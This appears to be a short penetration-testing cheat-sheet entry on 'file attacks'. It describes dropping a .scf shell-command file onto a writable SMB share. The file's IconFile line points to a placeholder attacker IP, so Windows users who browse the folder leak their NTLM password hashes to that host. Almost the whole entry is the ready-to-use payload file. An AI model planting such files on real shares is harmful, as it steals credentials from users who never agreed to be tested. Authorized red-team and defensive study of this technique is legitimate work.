# File Attacks

With write rights on a SMB share, it is possible to drop a .scf file with the following content to grab some user hashes:

    [Shell]
    Command=2
    IconFile=\<attacker_IP>\share\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
